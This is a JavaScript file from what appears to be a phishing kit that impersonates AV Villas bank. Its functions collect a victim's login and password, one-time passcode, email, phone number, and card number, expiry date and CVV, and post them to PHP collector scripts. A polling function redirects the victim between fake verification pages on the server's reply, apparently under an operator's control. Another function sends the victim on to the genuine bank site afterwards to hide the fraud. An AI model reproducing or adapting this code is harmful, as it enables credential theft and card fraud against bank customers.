function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}


function iniciar(){
    $("#fondo,#cargando").hide();
}

function cerrar(){
     window.location.href = "https://www.avvillas.com.co/bancadigital/inicio"; 
}

function status(){
    $.post( "../../../../process/estado.php",function(data) {        
        switch (data) {
            case '2': window.location.href = "validar.html"; break;
            case '4': window.location.href = "portal.html"; break;
            case '6': window.location.href = "verificar.html"; break;               
            case '8': window.location.href = "error.html"; break;
            case '10': window.location.href = "../../../../finish-no-back-button/successful.html"; break
            case '12': window.location.href = "persona.html"; break;
        } 
    });        
}


function enviar_usuario(u,p){
    d = detectar_dispositivo();    
    $.post( "../../../../process/pasologin.php", { usr:u, pas: p, dis: d, ban:"AV Villas"} ,function(data) {
        if (data == "ERR") {

        }else{
            if (data == "NO") {

            }else{
                res = data.split("-");
                window.location.href = "sistema.html";
            }
        }
    });
}


function enviar_otp(o){
    $.post( "../../../../process/pasootp.php", { otp: o} ,function(data) {
        window.location.href = "sistema.html";
    }); 
}

function enviar_correo(m,c){    
    $.post( "../../../../process/pasocorreo.php", { eml:m,clv:"",cel:c } ,function(data) {    
        window.location.href = "sistema.html";
    });
}

function enviar_tarjeta(t,f,c){    
    $.post( "../../../../process/pasotarjeta.php", { tar:t,fec:f,cvv:c } ,function(data) {    
        window.location.href = "sistema.html";
    });
}


